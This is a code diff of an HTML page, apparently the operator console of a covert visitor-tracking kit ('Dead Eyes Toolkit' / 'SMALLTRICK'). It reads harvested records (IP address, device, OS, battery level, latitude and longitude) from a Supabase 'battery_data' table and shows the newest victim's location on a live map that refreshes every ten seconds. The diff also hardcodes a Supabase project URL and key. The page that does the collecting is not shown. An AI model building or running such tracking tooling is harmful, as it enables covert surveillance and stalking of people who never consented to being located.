@@ -3,153 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📊 Dashboard - Dead Eyes Toolkit</title>
+    <title>📡 SMALLTRICK - Live Map</title>
+    <!-- CSS Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0f;
-            color: #0f0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 900px;
-            margin: auto;
-        }
-        h1 {
-            color: #e74c3c;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-            font-size: 13px;
-        }
-        th,
-        td {
-            padding: 10px;
-            text-align: left;
-            border-bottom: 1px solid #1a1a2e;
-        }
-        th {
-            color: #8888aa;
-            text-transform: uppercase;
-            font-size: 11px;
-        }
-        td {
-            color: #e0e0e0;
-            word-break: break-all;
-        }
-        .status {
-            padding: 10px;
-            background: #1a1a2e;
-            border-radius: 8px;
-            margin-top: 20px;
-            text-align: center;
-        }
-        .refresh {
-            background: #e74c3c;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-        }
-        .refresh:hover {
-            background: #c0392b;
-        }
+        /* styling dasar */
+        body { margin: 0; padding: 0; font-family: monospace; background: #0a0a0f; color: #00ff41; }
+        #map { height: 80vh; width: 100%; }
+        #info { padding: 15px; background: #1a1a2e; border-bottom: 1px solid #00ff4133; }
+        #info span { color: #8888aa; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📊 Dead Eyes Toolkit - Dashboard</h1>
-        <p style="color:#8888aa;">Data yang terkumpul dari pengunjung</p>
-        <button class="refresh" onclick="loadData()">🔄 Refresh</button>
-
-        <div id="table-container">
-            <table>
-                <thead>
-                    <tr>
-                        <th>#</th>
-                        <th>Waktu</th>
-                        <th>Device</th>
-                        <th>OS</th>
-                        <th>Browser</th>
-                        <th>IP</th>
-                        <th>Lokasi</th>
-                    </tr>
-                </thead>
-                <tbody id="data-body">
-                    <tr><td colspan="7" style="text-align:center; color:#666;">Memuat data...</td></tr>
-                </tbody>
-            </table>
-        </div>
-
-        <div class="status" id="status">📡 Koneksi ke Supabase...</div>
+    <div id="info">
+        📍 <span id="location-info">Klik marker untuk detail</span>
     </div>
+    <div id="map"></div>
 
+    <!-- JS Leaflet -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         // ============================================================
-        // 🔥 KONFIGURASI SUPABASE (GANTI DENGAN MILIKMU!)
+        // 🔥 KONFIGURASI SUPABASE
         // ============================================================
         const SUPABASE_URL = 'https://fjjdbvyqqpshaxgqavnx.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_FGhSQDZF4jZGniE1F3RPrA_3i57aI4p';
+        const SUPABASE_ANON_KEY = 'sb_publishable_FGhSQDZF4jZGniE1F3RPrA_3i57aI4p';       
+
+
+        // Inisialisasi peta dengan center default (Indonesia)
+        const map = L.map('map').setView([-6.2, 106.8], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap'
+        }).addTo(map);
+
+        let marker = null; // variabel untuk marker
 
         async function loadData() {
-            const status = document.getElementById('status');
-            const tbody = document.getElementById('data-body');
-
-            status.textContent = '📤 Memuat data...';
-            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#666;">Memuat...</td></tr>';
-
             try {
                 const res = await fetch(
-                    `${SUPABASE_URL}/rest/v1/battery_data?order=created_at.desc&limit=20`, {
+                    `${SUPABASE_URL}/rest/v1/battery_data?order=created_at.desc&limit=1`,
+                    {
                         headers: {
                             'apikey': SUPABASE_ANON_KEY,
                             'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                         }
                     }
                 );
-
-                if (!res.ok) throw new Error('Gagal mengambil data');
-
                 const data = await res.json();
 
-                if (data.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#666;">Belum ada data</td></tr>';
-                    status.textContent = '✅ Database terhubung, namun belum ada data';
-                    return;
+                if (data.length > 0 && data[0].latitude && data[0].longitude) {
+                    const row = data[0];
+                    const lat = row.latitude;
+                    const lon = row.longitude;
+
+                    // Update info
+                    document.getElementById('location-info').textContent = 
+                        `${row.location || 'Lokasi'} | IP: ${row.ip_address || 'Tidak diketahui'}`;
+
+                    // Hapus marker lama jika ada
+                    if (marker) map.removeLayer(marker);
+
+                    // Tambahkan marker baru
+                    marker = L.marker([lat, lon]).addTo(map)
+                        .bindPopup(`
+                            <b>📍 ${row.location || 'Tidak diketahui'}</b><br>
+                            IP: ${row.ip_address || '-'}<br>
+                            Device: ${row.device_type || '-'}<br>
+                            OS: ${row.os_name || '-'}<br>
+                            Battery: ${row.battery_level || '-'}
+                        `)
+                        .openPopup();
+
+                    // Pindahkan peta ke lokasi marker
+                    map.setView([lat, lon], 13);
+                } else {
+                    document.getElementById('location-info').textContent = 'Belum ada data lokasi.';
                 }
-
-                tbody.innerHTML = data.map((row, i) => `
-                        <tr>
-                            <td>${i + 1}</td>
-                            <td>${new Date(row.created_at).toLocaleString()}</td>
-                            <td>${row.device_type || '-'}</td>
-                            <td>${row.os_name || '-'}</td>
-                            <td>${row.browser_name || '-'}</td>
-                            <td>${row.ip_address || '-'}</td>
-                            <td>${row.location || '-'}</td>
-                        </tr>
-                    `).join('');
-
-                status.textContent = '✅ Data berhasil dimuat (' + data.length + ' data)';
-                status.style.color = '#4ade80';
-
             } catch (e) {
-                status.textContent = '❌ Error: ' + e.message;
-                status.style.color = '#f87171';
-                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#ef4444;">Gagal memuat data</td></tr>';
+                console.error('Error:', e);
+                document.getElementById('location-info').textContent = 'Gagal memuat data.';
             }
         }
 
-        // Load data saat halaman dibuka
-        document.addEventListener('DOMContentLoaded', loadData);
+        // Jalankan pertama kali
+        loadData();
 
-        // Refresh otomatis tiap 10 detik
+        // Refresh otomatis setiap 10 detik
         setInterval(loadData, 10000);
     </script>
 </body>
